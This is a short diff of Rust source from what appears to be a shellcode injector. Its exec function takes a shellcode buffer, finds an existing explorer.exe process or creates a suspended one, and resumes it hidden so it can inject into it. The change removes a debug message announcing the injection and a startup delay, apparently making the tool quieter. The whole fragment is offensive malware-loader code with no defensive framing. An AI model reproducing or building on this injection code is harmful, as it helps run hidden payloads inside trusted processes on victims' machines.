@@ -17,8 +17,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     };
 
     let process_id = if let Some(existing_pid) = pid {
-        #[cfg(feature = "debug")]
-        crate::utils::print_message(&format!("Found existing explorer.exe (PID: {}), injecting...", existing_pid));
         existing_pid
     } else {
         let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
@@ -26,8 +24,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
         // Resume immediately with SW_HIDE
         crate::api::resume_thread(process_info.hThread)?;
         
-        // Wait for process to initialize
-        crate::api::delay_execution_seconds(5)?;
         process_info.dwProcessId
     };
 
